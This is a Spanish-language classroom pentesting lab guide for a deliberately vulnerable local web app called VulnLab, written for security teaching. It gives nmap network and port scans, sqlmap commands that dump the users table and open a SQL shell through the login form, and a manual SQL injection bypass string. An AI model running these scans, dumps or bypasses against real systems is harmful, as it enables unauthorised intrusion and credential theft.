# Laboratorio de Pentesting: De la Red a la Base de Datos

Este manual detalla el proceso completo para preparar, descubrir, escanear y explotar la vulnerabilidad de SQL Injection en VulnLab.

## 0. Configuración del Entorno (ParrotOS / Kali)
Antes de comenzar, instala las herramientas necesarias y descarga el laboratorio.

**1. Instalar y Actualizar Herramientas:**
```bash
sudo apt update
sudo apt install git docker.io docker-compose nmap sqlmap -y
# Iniciar el servicio de Docker
sudo systemctl start docker
sudo systemctl enable docker
```

**2. Clonar el Repositorio:**
```bash
git clone https://github.com/williamstevencole/VulnLab.git
cd PENTESTING
```

---

## 1. Escenario
Estás ante una red social moderna llamada **VulnLab**. 

**Iniciar el Laboratorio:**
```bash
cd vulnerable
docker-compose up --build
```
- **Frontend:** React (Puerto 5173) -> `http://localhost:5173`
- **Backend:** Node.js (Puerto 3000) -> `http://localhost:3000`

---

## 2. Descubrimiento de Red (Host Discovery)
Identifica qué máquinas están activas en tu red local para encontrar el servidor.

**Comando para listar todas las IPs conectadas:**
```bash
# Sustituye 192.168.1.0/24 por tu rango de red actual
sudo nmap -sn 192.168.1.0/24
```
*Este comando realiza un "Ping Scan" para ver quién responde sin escanear puertos todavía.*

---

## 3. Escaneo de Puertos (Port Scanning)
Una vez identificada una IP sospechosa, verificamos los puertos abiertos rápidamente.

**Comando para ver puertos abiertos de forma rápida:**
```bash
nmap -p 3000-6000 <IP_OBJETIVO> --open
```
*Buscamos los puertos **3000** (API) y **5173** (Frontend).*

---

## 4. Enumeración de Servicios y Vulnerabilidades
Analizamos las versiones de los servicios para identificar posibles puntos de entrada.

**Comando para detectar versiones y vulnerabilidades:**
```bash
nmap -sV -sC -p 3000 <IP_OBJETIVO>
```
*   `-sV`: Detecta la versión del servicio (ej. Node.js Express).
*   `-sC`: Ejecuta scripts por defecto para detectar fallos comunes.

---

## 5. Explotación de Base de Datos (SQLMap)
Al confirmar que el puerto 3000 tiene un servicio web, procedemos a explotar el formulario de login.

**Paso A: Listar todas las bases de datos**
```bash
sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch --dbs
```

**Paso B: Listar las tablas de la base de datos `pentest_db`**
```bash
sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch -D pentest_db --tables
```

**Paso C: Exfiltrar contenido de una tabla específica (ej. `users`)**
```bash
sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch -D pentest_db -T users --dump
```

**Paso D: Obtener una Shell interactiva de SQL**
```bash
sqlmap -u "http://<IP_OBJETIVO>:3000/login" --data '{"username":"admin","password":"123"}' --method POST --batch --sql-shell
```

---

## 6. El Desafío Final
1. Identifica la IP del instructor mediante el escaneo de red.
2. Encuentra la contraseña de `admin_sys` usando `sqlmap`.
3. ¿Puedes encontrar el post de `elon_m` y leer su contenido directamente desde la base de datos?
4. **Extra:** Intenta entrar al sistema usando el bypass manual `admin_sys' --` en el navegador.

---

## 7. Comparación de Seguridad (Material de Referencia)
El instructor mostrará un código "Hardened" (Reforzado) que utiliza:
- **Prisma ORM** (Prevención de SQLi)
- **Bcrypt** (Hashing de contraseñas)
- **JWT (JSON Web Tokens)** (Sesiones seguras)
- **Zod** (Validación de esquemas)
- **Helmet** (Cabeceras de seguridad)
